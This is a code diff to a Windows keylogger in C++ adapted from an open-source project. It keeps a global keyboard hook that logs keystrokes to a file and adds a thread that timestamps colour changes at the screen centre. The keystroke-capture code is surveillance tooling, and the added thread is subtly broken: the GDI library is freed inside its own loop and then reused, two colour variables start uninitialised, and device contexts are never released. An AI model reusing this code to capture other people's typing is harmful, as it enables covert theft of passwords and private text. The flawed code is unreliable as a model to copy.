@@ -9,11 +9,12 @@ Adapted from GiacomoLaw/Keylogger
 #include <sstream>
 #include <chrono>
 #include <map>
+#include <thread>
+#include <math.h>
 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
 // or you will get problems since every function uses this variable.
 
-#if FORMAT == 0
 const std::map<int, std::string> keyname{
 		{VK_BACK, "[BACKSPACE]"},
 		{VK_RETURN, "[RETURN]"},
@@ -45,8 +46,9 @@ const std::map<int, std::string> keyname{
 		{VK_SUBTRACT, "-"},
 		{VK_CAPITAL, "[CAPSLOCK]"},
 };
-#endif
 HHOOK _hook;
+
+typedef WINAPI COLORREF (*GETPIXEL)(HDC, int, int);
 
 // This struct contains the data received by the hook callback. As you see in the callback function
 // it contains the thing you will need: vkCode = virtual key code.
@@ -135,6 +137,48 @@ int Save(int key_stroke)
 	return 0;
 }
 
+void colorThread()
+{
+	// Load library for reading pixels
+	HINSTANCE _hGDI = LoadLibrary("gdi32.dll");
+
+	double prev_r, prev_g, prev_b = 0;
+	if (_hGDI)
+	{
+		while (true)
+		{
+			GETPIXEL pGetPixel = (GETPIXEL)GetProcAddress(_hGDI, "GetPixel");
+			HDC _hdc = GetDC(NULL);
+			if (_hdc)
+			{
+				// get center of screen
+				int x = GetSystemMetrics(SM_CXSCREEN) / 2;
+				int y = GetSystemMetrics(SM_CYSCREEN) / 2;
+				// get color of pixel at center of screen
+				COLORREF color = (*pGetPixel)(_hdc, x, y);
+				int _red = GetRValue(color);
+				int _green = GetGValue(color);
+				int _blue = GetBValue(color);
+
+				double colorDistance = sqrt(pow(_red - prev_r, 2) + pow(_green - prev_g, 2) + pow(_blue - prev_b, 2));
+
+				if (colorDistance > 10)
+				{
+					// get time
+					unsigned long long now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
+					output_file << now << ",[Color Change: " << _red << " " << _green << " " << _blue << "]" << std::endl;
+					output_file.flush();
+					std::cout << "Color: " << _red << "," << _green << "," << _blue << std::endl;
+					prev_r = _red;
+					prev_g = _green;
+					prev_b = _blue;
+				}
+			}
+			FreeLibrary(_hGDI);
+		}
+	}
+}
+
 int main()
 {
 	// open output file in append mode
@@ -145,9 +189,13 @@ int main()
 	// set the hook
 	SetHook();
 
+	//Start reading color
+	std::thread t1(colorThread);
+
 	// loop to keep the console application running.
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 	}
+	t1.join();
 }
